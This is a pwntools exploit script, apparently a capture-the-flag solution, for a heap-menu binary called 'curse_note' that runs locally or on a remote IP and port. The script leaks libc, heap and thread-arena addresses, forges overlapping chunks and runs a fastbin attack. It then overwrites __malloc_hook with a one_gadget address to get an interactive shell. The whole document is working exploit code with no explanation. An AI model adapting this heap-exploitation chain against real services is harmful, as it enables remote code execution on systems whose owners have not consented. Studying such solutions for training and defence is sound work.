from pwn import *
debug=1
context.log_level = 'debug'
if debug:
    io = process("./curse_note")
else:
    io =remote("47.97.253.115",10002)
elf = ELF('./curse_note')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb       :io.recv(numb)
ru      = lambda delims  :io.recvuntil(delims)

def new(index,size,info):
    ru("choice: ")
    sl("1")
    ru("index: ")
    sl(index)
    ru("size: ")
    sl(size)
    ru("info: ")
    s(info)  

def show(index):
    ru("choice: ")
    sl("2")
    ru("index: ")
    sl(index)


def delete(index):
    ru("choice: ")
    sl("3")
    ru("index: ")    
    sl(index)

def exit():
    sl("4")
#leak libc
new(0,0x90-8,"1")
new(1,0x20-8,"1")
new(2,0x20-8,"1")
delete(0)
new(0,0x90-8,"1")
show(0)
leak=u64(r(16)[-8:])
libc.address=leak-0x3c4b78
log.success("libc : "+hex(libc.address))
#leak heap
delete(1)
delete(2)
new(1,0x20-8,"\x00")
show(1)
heap=u64(r(8))
log.success("heap : "+hex(heap))
delete(0)
delete(1)

#leak thread arena base
new(0,heap+0x11,"a")
new(0,0x100-8,"a")
new(1,0x70-8,"a")
new(2,0x100-8,"a")
delete(1)
new(1,0x30-8,"1")
delete(0)
delete(2)
new(0,0x100-8,"1")
show(0)
thread_heap=u64(r(16)[-8:])-0x170
thread_base=thread_heap-0x8b0
log.success("thread heap : "+hex(thread_heap))
delete(0)

#overlap 
new(0,0x70-8,"a"*(0x70-8-8)+p64(0x170))
new(2,thread_heap+0x178+1,"11111111") #preused=0
new(2,0x100-8,"1111111")
delete(2)
delete(0)

#fastbinattack
new(2,0x270-8,"a"*(0x100-8)+p64(0x75)+p64(libc.symbols['__malloc_hook']-0x23))
new(0,0x70-8,"1")

onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
onegadget=libc.address+onegadgets[3]
c="d"*0xB+p64(0)+p64(onegadget)+'\x00'*8
delete(1)
new(1,0x70-8,c)

delete(0)
ru("choice: ")
sl("1")
ru("index: ")
sl(0)
ru("size: ")
sl(0x30)

io.interactive()